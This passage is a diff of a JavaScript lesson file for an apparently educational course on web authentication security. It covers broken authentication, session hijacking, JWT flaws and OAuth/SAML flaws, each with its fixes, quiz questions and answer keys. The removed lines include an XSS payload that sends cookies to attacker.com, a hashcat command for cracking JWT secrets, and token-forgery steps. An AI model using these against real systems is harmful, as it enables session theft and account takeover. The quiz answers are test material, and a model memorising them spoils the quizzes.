@@ -1,592 +1,170 @@
 const LESSONS = [
   {
-    title: "Authentication Weaknesses",
+    title: "1. Authentication Weaknesses",
     points: 10,
-    content: `WHAT IS BROKEN AUTHENTICATION?
-Imagine you are trying to enter a super-secret treehouse club. To get inside, the club president stands at the door and asks for a secret handshake. This process of proving exactly who you are is called "Authentication." Every single website in the world does this when they ask you for a username and a password. They are checking your digital ID card to make sure you are really you! But what happens if the club president is really bad at his job? What if he lets people in who just guess the secret handshake, or what if he accidentally leaves a spare key under the doormat for anyone to find? In the computer world, this is called "Broken Authentication." It means the website's security guards made a huge mistake when building the front door. Hackers love these mistakes! Because the front door is broken, hackers can easily trick the guards, steal other people's ID cards, and walk right into the website pretending to be someone else. Once they are inside, they can read your private messages, spend your money, or lock you out of your own account completely!
-
-COMMON AUTHENTICATION WEAKNESSES:
-
-1. WEAK PASSWORD POLICIES:
-   - No minimum length requirements
-   - Common passwords allowed (password123, admin, qwerty)
-   - No complexity rules (uppercase, numbers, symbols)
-   - No expiry policy for sensitive systems
-
-2. BRUTE FORCE PROTECTION MISSING:
-   - No rate limiting on login attempts
-   - No account lockout after failed attempts
-   - No CAPTCHA to prevent automation
-   - No detection of distributed attacks (password spraying)
-
-3. VERBOSE ERROR MESSAGES:
-   - "Username not found" vs "Invalid password"
-   - Lets attackers enumerate valid usernames
-   - Better: always say "Invalid credentials" regardless of what failed
-
-4. INSECURE PASSWORD STORAGE:
-   - Plain text (catastrophic breach impact)
-   - Weak hashes: MD5, SHA1, SHA256 (crackable with GPU rigs in seconds)
-   - No salting: identical passwords → identical hashes → rainbow tables
-   - Best practice: bcrypt, Argon2, scrypt, or PBKDF2 (all adaptive, salted)
-
-5. NO MULTI-FACTOR AUTHENTICATION (MFA):
-   - Only a password — single point of failure
-   - Even a strong password is useless if stolen in phishing
-   - MFA options: TOTP (Google Authenticator), SMS (weaker), hardware key (YubiKey)
-
-6. FORGOTTEN PASSWORD FLAWS:
-   - Security questions (easily guessable: "mother's maiden name")
-   - Reset tokens sent over email without expiry
-   - Reset tokens that are predictable (sequential or timestamp-based)`,
     html: `<div class="htb-diagram-container"><img src="../../../assets/auth_weaknesses_diagram.png" alt="Authentication Weaknesses"></div>
-
-WHAT IS BROKEN AUTHENTICATION?
-Imagine you are trying to enter a super-secret treehouse club. To get inside, the club president stands at the door and asks for a secret handshake. This process of proving exactly who you are is called "Authentication." Every single website in the world does this when they ask you for a username and a password. They are checking your digital ID card to make sure you are really you! But what happens if the club president is really bad at his job? What if he lets people in who just guess the secret handshake, or what if he accidentally leaves a spare key under the doormat for anyone to find? In the computer world, this is called "Broken Authentication." It means the website's security guards made a huge mistake when building the front door. Hackers love these mistakes! Because the front door is broken, hackers can easily trick the guards, steal other people's ID cards, and walk right into the website pretending to be someone else. Once they are inside, they can read your private messages, spend your money, or lock you out of your own account completely!
-
-COMMON AUTHENTICATION WEAKNESSES:
-
-1. WEAK PASSWORD POLICIES:
-   - No minimum length requirements
-   - Common passwords allowed (password123, admin, qwerty)
-   - No complexity rules (uppercase, numbers, symbols)
-   - No expiry policy for sensitive systems
-
-2. BRUTE FORCE PROTECTION MISSING:
-   - No rate limiting on login attempts
-   - No account lockout after failed attempts
-   - No CAPTCHA to prevent automation
-   - No detection of distributed attacks (password spraying)
-
-3. VERBOSE ERROR MESSAGES:
-   - "Username not found" vs "Invalid password"
-   - Lets attackers enumerate valid usernames
-   - Better: always say "Invalid credentials" regardless of what failed
-
-4. INSECURE PASSWORD STORAGE:
-   - Plain text (catastrophic breach impact)
-   - Weak hashes: MD5, SHA1, SHA256 (crackable with GPU rigs in seconds)
-   - No salting: identical passwords → identical hashes → rainbow tables
-   - Best practice: bcrypt, Argon2, scrypt, or PBKDF2 (all adaptive, salted)
-
-5. NO MULTI-FACTOR AUTHENTICATION (MFA):
-   - Only a password — single point of failure
-   - Even a strong password is useless if stolen in phishing
-   - MFA options: TOTP (Google Authenticator), SMS (weaker), hardware key (YubiKey)
-
-6. FORGOTTEN PASSWORD FLAWS:
-   - Security questions (easily guessable: "mother's maiden name")
-   - Reset tokens sent over email without expiry
-   - Reset tokens that are predictable (sequential or timestamp-based)`,
+      <h3>Broken Authentication</h3>
+      <p>Broken Authentication is a broad category of vulnerabilities that occur when an application fails to properly implement and protect identity verification, session management, or credential storage. It allows attackers to compromise passwords, keys, or session tokens, ultimately allowing them to assume the identities of other users, permanently taking over accounts and accessing sensitive data.</p>
+      <p>Imagine you are trying to enter a super-secret treehouse club. To get inside, the club president stands at the door and asks for a secret handshake. Every single website in the world does this when they ask you for a username and a password. But what happens if the club president is really bad at his job? What if he lets people in who just guess the secret handshake, or what if he accidentally leaves a spare key under the doormat? Because the front door is broken, hackers can easily trick the guards, steal other people's ID cards, and walk right into the website pretending to be someone else.</p>
+      <h3>Common Weaknesses</h3>
+      <div class="step-block">
+        <div class="step-num">Weakness 1</div>
+        <div class="step-body"><strong>Brute Force & Weak Passwords</strong><br>Missing rate limits allow attackers to perform automated credential stuffing or dictionary attacks. If the password policy is weak, guessing passwords becomes trivial.</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Weakness 2</div>
+        <div class="step-body"><strong>Verbose Error Messages</strong><br>An error like "Username not found" vs "Invalid password" allows attackers to silently enumerate thousands of valid usernames on the system before launching targeted password attacks.</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Weakness 3</div>
+        <div class="step-body"><strong>Insecure Password Storage</strong><br>Storing passwords in plaintext or using outdated, unsalted hashes (like MD5) allows attackers to instantly crack the database using precomputed Rainbow Tables if a breach occurs.</div>
+      </div>`,
     questions: [
-      { q: "What is it called when a login page returns no limit on login attempts?", a: "Missing brute force protection (or no rate limiting)" },
-      { q: "What type of error message helps attackers enumerate valid usernames?", a: "Verbose error messages (e.g., 'Username not found')" },
-      { q: "What is the recommended modern algorithm for storing passwords securely?", a: "bcrypt (or Argon2, scrypt, PBKDF2)" },
-      { q: "Why does storing passwords without salting allow rainbow table attacks?", a: "Identical passwords produce identical hashes, which can be precomputed" },
-      { q: "What second authentication factor is considered the strongest form of MFA?", a: "Hardware security key (e.g., YubiKey / FIDO2)" }
+      { q: "What is it called when a login page returns no limit on login attempts?", a: "Missing brute force protection (or no rate limiting)", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What type of error message helps attackers enumerate valid usernames?", a: "Verbose error messages (e.g., 'Username not found')", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What is the recommended modern algorithm for storing passwords securely?", a: "bcrypt (or Argon2, scrypt, PBKDF2)", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "Why does storing passwords without salting allow rainbow table attacks?", a: "Identical passwords produce identical hashes, which can be precomputed", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What second authentication factor is considered the strongest form of MFA?", a: "Hardware security key (e.g., YubiKey / FIDO2)", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
     ]
   },
   {
-    title: "Session Hijacking",
+    title: "2. Session Hijacking",
     points: 10,
-    content: `WHAT IS SESSION HIJACKING?
-Imagine you go to a giant amusement park. When you buy your ticket, the person at the front gate checks your ID and gives you a special, un-copyable wristband. For the rest of the day, you don't have to show your ID to ride the rollercoasters; you just flash your wristband to the ride operator, and they let you right on! Websites use the exact same trick to keep you logged in. After you type your password correctly, the website gives your browser a special digital wristband called a "Session Token" (or a cookie). Every time you click a new page, your browser flashes this wristband so the website remembers who you are. But here is the scary part: what if a sneaky thief steals your wristband right off your arm? If a hacker manages to steal your digital Session Token, they can put it on their own browser. When they visit the website, the website sees the wristband and thinks the hacker is YOU! They can impersonate you perfectly, read your emails, and change your password, all without ever needing to know your real password!
-
-SESSION HIJACKING METHODS:
-
-1. SESSION FIXATION:
-   - Attacker gives you a known session ID via a crafted URL or cookie
-   - You log in, binding your account to that session ID
-   - Attacker uses the same session ID to access your account
-   - Prevention: Always regenerate the session ID upon successful login
-
-2. SESSION SNIFFING (Network-level):
-   - Capturing session cookies over unencrypted HTTP
-   - Possible on shared networks (coffee shop WiFi, corporate LAN)
-   - Prevention: Use HTTPS everywhere + "Secure" cookie flag
-
-3. CROSS-SITE SCRIPTING (XSS) — Cookie Theft:
-   - Payload: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
-   - Prevention: "HttpOnly" flag on session cookies prevents JS access
-
-4. PREDICTABLE SESSION TOKENS:
-   - If tokens are sequential (1, 2, 3) or timestamp-based
-   - Attacker can guess another user's session
-   - Prevention: Use cryptographically random, long tokens (128+ bits of entropy)
-   - Python: secrets.token_hex(32), Node.js: crypto.randomBytes(32)
-
-5. CSRF (Cross-Site Request Forgery):
-   - Attacker makes victim's browser send requests using their session
-   - Example: victim visits attacker.com → silently sends request to bank.com
-   - Prevention: CSRF tokens, SameSite=Strict cookie attribute
-
-SESSION EXPIRY BEST PRACTICES:
-   - Idle timeout: 15-30 min for banking, 8hr for normal apps
-   - Absolute timeout: even if active, max 24 hours
-   - Immediate invalidation on logout
-   - Option to invalidate all sessions from other devices`,
     html: `<div class="htb-diagram-container"><img src="../../../assets/auth_session_hijack_diagram.png" alt="Session Hijacking"></div>
-
-WHAT IS SESSION HIJACKING?
-Imagine you go to a giant amusement park. When you buy your ticket, the person at the front gate checks your ID and gives you a special, un-copyable wristband. For the rest of the day, you don't have to show your ID to ride the rollercoasters; you just flash your wristband to the ride operator, and they let you right on! Websites use the exact same trick to keep you logged in. After you type your password correctly, the website gives your browser a special digital wristband called a "Session Token" (or a cookie). Every time you click a new page, your browser flashes this wristband so the website remembers who you are. But here is the scary part: what if a sneaky thief steals your wristband right off your arm? If a hacker manages to steal your digital Session Token, they can put it on their own browser. When they visit the website, the website sees the wristband and thinks the hacker is YOU! They can impersonate you perfectly, read your emails, and change your password, all without ever needing to know your real password!
-
-SESSION HIJACKING METHODS:
-
-1. SESSION FIXATION:
-   - Attacker gives you a known session ID via a crafted URL or cookie
-   - You log in, binding your account to that session ID
-   - Attacker uses the same session ID to access your account
-   - Prevention: Always regenerate the session ID upon successful login
-
-2. SESSION SNIFFING (Network-level):
-   - Capturing session cookies over unencrypted HTTP
-   - Possible on shared networks (coffee shop WiFi, corporate LAN)
-   - Prevention: Use HTTPS everywhere + "Secure" cookie flag
-
-3. CROSS-SITE SCRIPTING (XSS) — Cookie Theft:
-   - Payload: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
-   - Prevention: "HttpOnly" flag on session cookies prevents JS access
-
-4. PREDICTABLE SESSION TOKENS:
-   - If tokens are sequential (1, 2, 3) or timestamp-based
-   - Attacker can guess another user's session
-   - Prevention: Use cryptographically random, long tokens (128+ bits of entropy)
-   - Python: secrets.token_hex(32), Node.js: crypto.randomBytes(32)
-
-5. CSRF (Cross-Site Request Forgery):
-   - Attacker makes victim's browser send requests using their session
-   - Example: victim visits attacker.com → silently sends request to bank.com
-   - Prevention: CSRF tokens, SameSite=Strict cookie attribute
-
-SESSION EXPIRY BEST PRACTICES:
-   - Idle timeout: 15-30 min for banking, 8hr for normal apps
-   - Absolute timeout: even if active, max 24 hours
-   - Immediate invalidation on logout
-   - Option to invalidate all sessions from other devices`,
+      <h3>Session Hijacking</h3>
+      <p>Session Hijacking (or Cookie Hijacking) is the exploitation of a valid computer session to gain unauthorized access. Once a user logs in, the server issues a session token. If an attacker intercepts or predicts this token, they can present it to the server and completely bypass the authentication process, impersonating the user without needing their credentials.</p>
+      <p>Imagine you go to a giant amusement park. When you buy your ticket, the person at the front gate checks your ID and gives you a special, un-copyable wristband. For the rest of the day, you don't have to show your ID to ride the rollercoasters; you just flash your wristband! Websites use the exact same trick to keep you logged in. After you type your password correctly, the website gives your browser a special digital wristband called a "Session Token". If a sneaky thief steals your wristband right off your arm, they can put it on their own browser. The website sees the wristband and thinks the hacker is YOU!</p>
+      <h3>Attack Vectors & Prevention</h3>
+      <div class="step-block">
+        <div class="step-num">Vector 1</div>
+        <div class="step-body"><strong>Session Sniffing & XSS</strong><br>Capturing session cookies over unencrypted HTTP (prevented by the <code>Secure</code> flag) or stealing them via JavaScript execution in an XSS attack (prevented by the <code>HttpOnly</code> flag).</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Vector 2</div>
+        <div class="step-body"><strong>Session Fixation</strong><br>The attacker gives the victim a known session ID before they log in. Prevented by always regenerating the session ID upon login.</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Vector 3</div>
+        <div class="step-body"><strong>Predictable Tokens</strong><br>Using sequential or timestamp-based tokens allows attackers to guess other users' active sessions. Tokens must always be cryptographically random.</div>
+      </div>`,
     questions: [
-      { q: "What attack gives a victim a known session ID before they log in?", a: "Session fixation" },
-      { q: "What cookie flag prevents transmission of the cookie over unencrypted HTTP?", a: "Secure" },
-      { q: "What cookie flag prevents JavaScript from reading the session cookie via document.cookie?", a: "HttpOnly" },
-      { q: "Should session tokens be predictable or cryptographically random?", a: "Cryptographically random" },
-      { q: "What cookie attribute (SameSite=___) prevents the browser from sending cookies with cross-site requests?", a: "Strict" }
+      { q: "What attack gives a victim a known session ID before they log in?", a: "Session fixation", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What cookie flag prevents transmission of the cookie over unencrypted HTTP?", a: "Secure", hint: "Check the command reference blocks." },
+      { q: "What cookie flag prevents JavaScript from reading the session cookie via document.cookie?", a: "HttpOnly", hint: "Check the command reference blocks." },
+      { q: "Should session tokens be predictable or cryptographically random?", a: "Cryptographically random", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What cookie attribute (SameSite=___) prevents the browser from sending cookies with cross-site requests?", a: "Strict", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
     ]
   },
   {
-    title: "JWT & Modern Auth Vulnerabilities",
+    title: "3. JWT & Modern Auth Vulnerabilities",
     points: 10,
-    content: `WHAT ARE MODERN TOKENS?
-Think about how normal movie tickets work. When you hand the ticket to the usher, they usually have to check a giant list on their clipboard to make sure the ticket is real. This takes a lot of time. Now imagine a super-advanced movie ticket. Instead of checking a clipboard, the usher just looks at a special, magical stamp on the ticket. The stamp proves the ticket is real instantly, without needing a clipboard at all! Modern websites use these super-tickets, and they are called JSON Web Tokens (or JWTs). Because big websites like Netflix or Facebook have millions of users, checking a massive database every time someone clicks a button takes too long. Instead, they give your browser a JWT. This token contains a mathematical signature (like the magical stamp) that proves who you are instantly. But because these tokens are so powerful and complicated, programmers often make tiny mistakes when setting them up. Hackers actively hunt for these mistakes so they can forge their own magical stamps and sneak into the website for free!
-
-WHAT IS A JWT?
-A JWT consists of three base64url-encoded parts separated by dots:
-  HEADER.PAYLOAD.SIGNATURE
-
-Header:    {"alg":"HS256","typ":"JWT"}
-Payload:   {"sub":"user123","role":"user","iat":1716000000,"exp":1716086400}
-Signature: HMACSHA256(base64url(header)+"."+base64url(payload), secret)
-
-JWT VULNERABILITIES:
-
-1. ALGORITHM CONFUSION (alg:none attack):
-   - Change alg to "none", remove the signature
-   - Modify payload (e.g., "role":"user" → "role":"admin")
-   - Server accepts the unsigned token!
-   Fix: Enforce a specific algorithm server-side; never trust alg from client.
-
-2. RS256 → HS256 CONFUSION:
-   - Server uses RS256 (asymmetric RSA key pair)
-   - Attacker switches alg to HS256 (symmetric HMAC)
-   - Signs token with server's PUBLIC key (which is public!)
-   - Server verifies using public key as HMAC secret → accepts it!
-   Fix: Reject algorithm changes; pin to expected algorithm.
-
-3. WEAK HMAC SECRET:
-   - Secret is "secret", "password123", or "jwt-secret"
-   - Attacker cracks it offline using hashcat:
-       hashcat -a 0 -m 16500 token.jwt wordlist.txt
-   - Signs arbitrary payloads with cracked secret
-   Fix: Use 256-bit cryptographically random secrets.
-
-4. SENSITIVE DATA IN PAYLOAD:
-   - JWT payload is base64-encoded, NOT encrypted
-   - Anyone can decode it: atob(payload) or jwt.io
-   - Never store passwords, PII, or secrets in payload
-
-5. MISSING EXPIRY (exp claim):
-   - Without exp, tokens are valid forever
-   - If stolen, attacker has permanent access
-   Fix: Short exp times + refresh tokens for long sessions.
-
-TOOLS:
-  jwt.io         → Decode and inspect JWTs in browser
-  jwt_tool       → Automated JWT attack tool (Python)
-  Burp Extension → JSON Web Tokens extension`,
-    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_jwt_diagram.png" alt="JWT & Modern Auth Vulnerabilities"></div>
-
-WHAT ARE MODERN TOKENS?
-Think about how normal movie tickets work. When you hand the ticket to the usher, they usually have to check a giant list on their clipboard to make sure the ticket is real. This takes a lot of time. Now imagine a super-advanced movie ticket. Instead of checking a clipboard, the usher just looks at a special, magical stamp on the ticket. The stamp proves the ticket is real instantly, without needing a clipboard at all! Modern websites use these super-tickets, and they are called JSON Web Tokens (or JWTs). Because big websites like Netflix or Facebook have millions of users, checking a massive database every time someone clicks a button takes too long. Instead, they give your browser a JWT. This token contains a mathematical signature (like the magical stamp) that proves who you are instantly. But because these tokens are so powerful and complicated, programmers often make tiny mistakes when setting them up. Hackers actively hunt for these mistakes so they can forge their own magical stamps and sneak into the website for free!
-
-WHAT IS A JWT?
-A JWT consists of three base64url-encoded parts separated by dots:
-  HEADER.PAYLOAD.SIGNATURE
-
-Header:    {"alg":"HS256","typ":"JWT"}
-Payload:   {"sub":"user123","role":"user","iat":1716000000,"exp":1716086400}
-Signature: HMACSHA256(base64url(header)+"."+base64url(payload), secret)
-
-JWT VULNERABILITIES:
-
-1. ALGORITHM CONFUSION (alg:none attack):
-   - Change alg to "none", remove the signature
-   - Modify payload (e.g., "role":"user" → "role":"admin")
-   - Server accepts the unsigned token!
-   Fix: Enforce a specific algorithm server-side; never trust alg from client.
-
-2. RS256 → HS256 CONFUSION:
-   - Server uses RS256 (asymmetric RSA key pair)
-   - Attacker switches alg to HS256 (symmetric HMAC)
-   - Signs token with server's PUBLIC key (which is public!)
-   - Server verifies using public key as HMAC secret → accepts it!
-   Fix: Reject algorithm changes; pin to expected algorithm.
-
-3. WEAK HMAC SECRET:
-   - Secret is "secret", "password123", or "jwt-secret"
-   - Attacker cracks it offline using hashcat:
-       hashcat -a 0 -m 16500 token.jwt wordlist.txt
-   - Signs arbitrary payloads with cracked secret
-   Fix: Use 256-bit cryptographically random secrets.
-
-4. SENSITIVE DATA IN PAYLOAD:
-   - JWT payload is base64-encoded, NOT encrypted
-   - Anyone can decode it: atob(payload) or jwt.io
-   - Never store passwords, PII, or secrets in payload
-
-5. MISSING EXPIRY (exp claim):
-   - Without exp, tokens are valid forever
-   - If stolen, attacker has permanent access
-   Fix: Short exp times + refresh tokens for long sessions.
-
-TOOLS:
-  jwt.io         → Decode and inspect JWTs in browser
-  jwt_tool       → Automated JWT attack tool (Python)
-  Burp Extension → JSON Web Tokens extension`,
+    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_jwt_diagram.png" alt="JWT Tokens"></div>
+      <h3>JSON Web Tokens (JWT)</h3>
+      <p>A JSON Web Token (JWT) is an open standard that securely transmits information between parties as a JSON object, digitally signed. Misconfigurations in verifying the signature (such as trusting user-supplied algorithms or using weak secrets) lead to severe cryptographic vulnerabilities.</p>
+      <p>Think about how normal movie tickets work. When you hand the ticket to the usher, they check a giant list to make sure the ticket is real. Now imagine a super-advanced movie ticket. Instead of checking a list, the usher just looks at a special, magical stamp on the ticket. The stamp proves the ticket is real instantly! Modern websites use these super-tickets, called JWTs. This token contains a mathematical signature (the magical stamp) that proves who you are instantly. But if programmers make mistakes, hackers forge their own magical stamps and sneak into the website for free!</p>
+      <h3>JWT Flaws</h3>
+      <div class="step-block">
+        <div class="step-num">Flaw 1</div>
+        <div class="step-body"><strong>Algorithm Confusion (alg:none)</strong><br>An attacker changes the header's algorithm to <code>"none"</code> and removes the signature. If the server implicitly trusts the header, it accepts the unsigned token as valid!</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Flaw 2</div>
+        <div class="step-body"><strong>Weak HMAC Secrets</strong><br>If the server uses a weak, guessable string (like "secret123") to sign the JWT, attackers can crack the signature offline and forge tokens as an Administrator.</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Flaw 3</div>
+        <div class="step-body"><strong>Sensitive Payload Data</strong><br>The payload of a JWT is merely base64-encoded, not encrypted. Storing passwords or API keys inside the payload exposes it to anyone who intercepts the token.</div>
+      </div>`,
     questions: [
-      { q: "What are the three parts of a JWT token separated by dots?", a: "Header, Payload, Signature" },
-      { q: "What JWT attack changes the algorithm to 'none' and removes the signature?", a: "Algorithm confusion / alg:none attack" },
-      { q: "Is the JWT payload encrypted or just base64-encoded?", a: "Just base64-encoded (NOT encrypted)" },
-      { q: "What JWT claim defines when the token expires?", a: "exp (expiration)" },
-      { q: "What hashcat mode is used to crack JWT HMAC signatures?", a: "16500" }
+      { q: "What are the three parts of a JWT token separated by dots?", a: "Header, Payload, Signature", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What JWT attack changes the algorithm to 'none' and removes the signature?", a: "Algorithm confusion / alg:none attack", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "Is the JWT payload encrypted or just base64-encoded?", a: "Just base64-encoded (NOT encrypted)", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What JWT claim defines when the token expires?", a: "exp (expiration)", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What hashcat mode is used to crack JWT HMAC signatures?", a: "16500", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
     ]
   },
   {
-    title: "OAuth 2.0 & SSO Vulnerabilities",
+    title: "4. OAuth 2.0 & SSO Vulnerabilities",
     points: 10,
-    content: `WHAT IS OAUTH?
-Have you ever tried to sign up for a new game on your phone, and instead of asking you to invent a new password, the game just has a giant button that says "Sign in with Google" or "Sign in with Facebook"? That magical button is powered by a system called OAuth 2.0! Imagine you want to hire a dog walker. Instead of giving the dog walker the master key to your entire house, you call the security guard at your neighborhood gate and say, "Hey, it is okay to let this dog walker into my yard, but ONLY into the yard." OAuth works exactly like that! It is a secure way to let a new app (the dog walker) access some of your information on Google or Facebook, without ever actually giving the new app your secret password. It is incredibly convenient for users, but it is a very complicated system for programmers to build. If the programmer forgets to double-check the security guard's badge, or accidentally leaves the gate open, hackers can trick the system into giving them the master keys to everyone's accounts!
-
-HOW OAUTH 2.0 WORKS (Authorization Code Flow):
-  1. User clicks "Login with Google"
-  2. App redirects user to Google with: client_id, redirect_uri, scope, state
-  3. User authorizes the app on Google's page
-  4. Google redirects to redirect_uri with an authorization code
-  5. App exchanges code for access_token (server-side)
-  6. App uses access_token to call Google APIs (e.g., get profile)
-
-OAUTH VULNERABILITIES:
-
-1. CSRF VIA MISSING STATE PARAMETER:
-   The state parameter is a CSRF token for OAuth.
-   If missing: attacker can initiate OAuth flow, trick victim into
-   completing it, linking attacker's account to victim's session.
-   Fix: Always validate the state parameter.
-
-2. REDIRECT_URI MANIPULATION:
-   If the app doesn't strictly validate redirect_uri:
-   - Attacker registers: https://attacker.com as redirect
-   - Or uses path traversal: https://legit.com/../attacker.com
-   - The authorization code is sent to the attacker
-   Fix: Exact match whitelist of redirect URIs.
-
-3. AUTHORIZATION CODE INTERCEPTION:
-   - Authorization codes sent in URL fragments (#code=...)
-   - Logged in browser history, referrer headers, server logs
-   Fix: Use PKCE (Proof Key for Code Exchange) for mobile/SPA apps.
-
-4. OPEN REDIRECT TO STEAL TOKENS:
-   If the app has an open redirect vulnerability:
-   ?redirect=https://attacker.com → steals the code in the redirect
-
-5. IMPLICIT FLOW (DEPRECATED — DO NOT USE):
-   Returns access_token directly in the URL fragment
-   Visible in browser history, referrer headers
-   Fix: Use Authorization Code + PKCE instead.
-
-SSO (SAML) VULNERABILITIES:
-   SAML uses XML assertions signed by an Identity Provider (IdP).
-   XML Signature Wrapping (XSW): move the signed assertion, insert
-   a malicious unsigned one — some parsers validate the wrong element.
-   Fix: Strictly validate which element is signed.`,
-    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_oauth_diagram.png" alt="OAuth 2.0 & SSO Vulnerabilities"></div>
-
-WHAT IS OAUTH?
-Have you ever tried to sign up for a new game on your phone, and instead of asking you to invent a new password, the game just has a giant button that says "Sign in with Google" or "Sign in with Facebook"? That magical button is powered by a system called OAuth 2.0! Imagine you want to hire a dog walker. Instead of giving the dog walker the master key to your entire house, you call the security guard at your neighborhood gate and say, "Hey, it is okay to let this dog walker into my yard, but ONLY into the yard." OAuth works exactly like that! It is a secure way to let a new app (the dog walker) access some of your information on Google or Facebook, without ever actually giving the new app your secret password. It is incredibly convenient for users, but it is a very complicated system for programmers to build. If the programmer forgets to double-check the security guard's badge, or accidentally leaves the gate open, hackers can trick the system into giving them the master keys to everyone's accounts!
-
-HOW OAUTH 2.0 WORKS (Authorization Code Flow):
-  1. User clicks "Login with Google"
-  2. App redirects user to Google with: client_id, redirect_uri, scope, state
-  3. User authorizes the app on Google's page
-  4. Google redirects to redirect_uri with an authorization code
-  5. App exchanges code for access_token (server-side)
-  6. App uses access_token to call Google APIs (e.g., get profile)
-
-OAUTH VULNERABILITIES:
-
-1. CSRF VIA MISSING STATE PARAMETER:
-   The state parameter is a CSRF token for OAuth.
-   If missing: attacker can initiate OAuth flow, trick victim into
-   completing it, linking attacker's account to victim's session.
-   Fix: Always validate the state parameter.
-
-2. REDIRECT_URI MANIPULATION:
-   If the app doesn't strictly validate redirect_uri:
-   - Attacker registers: https://attacker.com as redirect
-   - Or uses path traversal: https://legit.com/../attacker.com
-   - The authorization code is sent to the attacker
-   Fix: Exact match whitelist of redirect URIs.
-
-3. AUTHORIZATION CODE INTERCEPTION:
-   - Authorization codes sent in URL fragments (#code=...)
-   - Logged in browser history, referrer headers, server logs
-   Fix: Use PKCE (Proof Key for Code Exchange) for mobile/SPA apps.
-
-4. OPEN REDIRECT TO STEAL TOKENS:
-   If the app has an open redirect vulnerability:
-   ?redirect=https://attacker.com → steals the code in the redirect
-
-5. IMPLICIT FLOW (DEPRECATED — DO NOT USE):
-   Returns access_token directly in the URL fragment
-   Visible in browser history, referrer headers
-   Fix: Use Authorization Code + PKCE instead.
-
-SSO (SAML) VULNERABILITIES:
-   SAML uses XML assertions signed by an Identity Provider (IdP).
-   XML Signature Wrapping (XSW): move the signed assertion, insert
-   a malicious unsigned one — some parsers validate the wrong element.
-   Fix: Strictly validate which element is signed.`,
+    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_oauth_diagram.png" alt="OAuth 2.0"></div>
+      <h3>What is OAuth 2.0?</h3>
+      <p>OAuth 2.0 is the industry-standard authorization protocol that allows third-party services to exchange web resources on behalf of a user without revealing their credentials. It uses Authorization Codes and Access Tokens to securely delegate access. Vulnerabilities occur when redirect URIs are poorly validated or when CSRF protections are omitted.</p>
+      <p>Have you ever tried to sign up for a new game, and instead of inventing a password, you click "Sign in with Google"? That is powered by OAuth 2.0! Imagine you want to hire a dog walker. Instead of giving the dog walker the master key to your entire house, you call the security guard at your neighborhood gate and say, "Hey, it is okay to let this dog walker into my yard, but ONLY into the yard." OAuth works exactly like that! It is a secure way to let an app access some of your information without giving them your secret password.</p>
+      <h3>Common Flow Exploits</h3>
+      <div class="step-block">
+        <div class="step-num">Exploit 1</div>
+        <div class="step-body"><strong>Missing State Parameter (CSRF)</strong><br>The <code>state</code> parameter acts as a CSRF token. Without it, an attacker can trick the victim into submitting an authorization code, linking the victim's account to the attacker's third-party login.</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Exploit 2</div>
+        <div class="step-body"><strong>Redirect URI Manipulation</strong><br>If the identity provider doesn't strictly whitelist the <code>redirect_uri</code>, an attacker can modify the URL to point to <code>https://attacker.com</code>, stealing the victim's secret authorization code!</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Exploit 3</div>
+        <div class="step-body"><strong>Implicit Flow Risks</strong><br>The deprecated Implicit Flow returns the access token directly in the URL fragment, exposing it in browser history. Modern implementations use Authorization Code + PKCE instead.</div>
+      </div>`,
     questions: [
-      { q: "What OAuth 2.0 parameter acts as a CSRF token to prevent cross-site request forgery in the auth flow?", a: "state" },
-      { q: "What OAuth attack redirects the authorization code to an attacker-controlled URL?", a: "Redirect URI manipulation" },
-      { q: "What OAuth extension should mobile and SPA apps use instead of client secrets?", a: "PKCE (Proof Key for Code Exchange)" },
-      { q: "Why is the OAuth Implicit Flow deprecated?", a: "It returns the access_token directly in the URL, exposing it in browser history and referrer headers" },
-      { q: "What SAML attack manipulates the XML signature to validate an unsigned malicious assertion?", a: "XML Signature Wrapping (XSW)" }
+      { q: "What OAuth 2.0 parameter acts as a CSRF token to prevent cross-site request forgery in the auth flow?", a: "state", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What OAuth attack redirects the authorization code to an attacker-controlled URL?", a: "Redirect URI manipulation", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What OAuth extension should mobile and SPA apps use instead of client secrets?", a: "PKCE (Proof Key for Code Exchange)", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "Why is the OAuth Implicit Flow deprecated?", a: "It returns the access_token directly in the URL, exposing it in browser history and referrer headers", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What SAML attack manipulates the XML signature to validate an unsigned malicious assertion?", a: "XML Signature Wrapping (XSW)", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
     ]
   },
   {
-    title: "Multi-Factor Authentication Deep Dive",
+    title: "5. Multi-Factor Authentication Deep Dive",
     points: 10,
-    content: `WHY DO WE NEED MULTI-FACTOR AUTHENTICATION?
